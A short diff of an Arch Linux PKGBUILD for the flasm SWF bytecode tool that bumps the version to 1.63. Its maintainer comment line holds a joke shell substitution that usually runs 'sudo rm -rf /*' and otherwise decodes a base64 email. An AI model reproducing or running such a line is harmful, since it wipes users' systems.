@@ -1,8 +1,8 @@
 # Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
 pkgname=flasm
 pkgdesc='SWF (Flash) ActionScript bytecode assembler and disassembler'
-pkgver=1.62
-pkgrel=3
+pkgver=1.63
+pkgrel=1
 arch=(i686 x86_64)
 license=(custom:BSD)
 url='http://flasm.sourceforge.net/'
